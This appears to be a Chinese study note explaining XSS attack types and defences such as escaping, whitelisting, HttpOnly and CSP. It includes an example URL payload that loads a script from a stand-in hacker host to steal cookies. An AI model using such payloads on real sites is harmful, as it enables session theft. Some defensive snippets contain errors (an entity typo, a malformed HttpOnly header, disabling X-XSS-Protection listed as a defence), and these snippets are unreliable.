## XSS
Cross Site Scripting
跨站式脚本攻击，指的是通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或JavaScript的一种攻击。

先看个例子
用户输入：`baidu.com/book=<script>alert(1)</script>`
该网站代码
index.jsp
```html
<body>
  书籍:{book}
</body>
```
假设book后面的参数会被该网址以变量的形式拼接到html上。
用户访问这段url就能看到弹窗1
有人会觉得这有啥用啊，我一开始学习的时候也觉得没啥用，这其实是黑客用来简单测试这个网站能不能通过XSS攻击，后面再进行别的高深操作。
接下来黑客开始骚操作。
`baidu.com/book=<script src="heike.com"></script>`
黑客代码
```js
console.log(document.cookie)
```
通过在网站里面执行脚本，这个脚本通过src请求第三方服务，也就是黑客的服务，黑客就能通过服务去获取你的cookie值，因为同源下http会自动携带cookie。
一般来说黑客会给你这么一段链接，你访问这个链接就会中招。
这时候你可能又会有疑问，谁没事会执行这么一段代码，黑客可能就是会通过一些短网址，也就是通过一段短网址来代替真实的网址，通过一些邮件，或者美女图片链接来诱惑你点击。
### XSS类型
#### 反射型
##### 步骤
1. 攻击者构造出特殊的URL，其中包含恶意代码
2. 用户打开带有恶意代码的URL时，网站服务器将恶意代码从URL取出，拼接在HTML中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
#### 存储型
这是最危险的跨站脚本，相比反射型和DOM型具有更高的隐蔽性，因为它不需要用户手动触发，任何允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提供一段XSS代码后，被服务端接收并存储，当所有浏览者访问某个页面都会被XSS

##### 步骤
1. 攻击者将恶意代码提交到目标网站的数据库
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在html上返回给浏览器。
3. 用户浏览器接收到相应后解析执行，混在其中的恶意代码也被执行
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作
#### DOM型
DOM型和反射型不一样的地方在于，DOM型取出和执行由浏览器完成，属于前端的漏洞，而反射型会通过服务端接收并拼接html返回。
##### 步骤
1. 攻击者构造出特殊的URL，其中包含恶意代码
2. 用户打开带有恶意代码的URL
3. 用户浏览器接收到相应后解析执行，前端JavaScript取出URL中的恶意代码并执行
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标接口执行攻击者指定的操作
#### 影响
- 利用虚拟输入表单骗取用户个人信息。
- 利用脚步窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片
#### 预防
- **httpOnly**
只能通过Http或者Https访问cookie，其他方式无法访问，例如js脚本
`response.addHeader("set-cookie","HttpOnly")`
- **输入过滤**
不管是前端、后端、sql，凡是输入的地方都得过滤，因为都有可能遭受XSS攻击。比如说一些校验库，validator。
- **转义HTML**
就是把html的一些标签进行转移，也叫黑名单
```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```
但是这样会导致一些问题，比如说`<h1>哈哈哈</h1>`，在富文本这种场景下就没办法按照原来的格式去展示<h1>哈哈哈</h1>，而只是展示字符串`<h1>哈哈哈</h1>`，所以有了白名单
- **白名单**
一般会有白名单的库，否则内容太多了。
```js
const xss = require('xss');
xss('<h1>哈哈哈</h1>')
```
[xss库中文文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
- 浏览器禁止xss过滤
`ctx.set('X-XSS-Protection',0)`
- CSP
Content Security Policy 内容安全策略
开发者明确告诉客户端，哪些外部资源是可以加载和执行，即使攻击者发现漏洞，也是没办法注入脚本的。
## 参考
- [前端面试查漏补缺--(七) XSS攻击与CSRF攻击](https://juejin.cn/post/6844903781704925191?searchId=2023101213230224E443DF12135B2EAE29)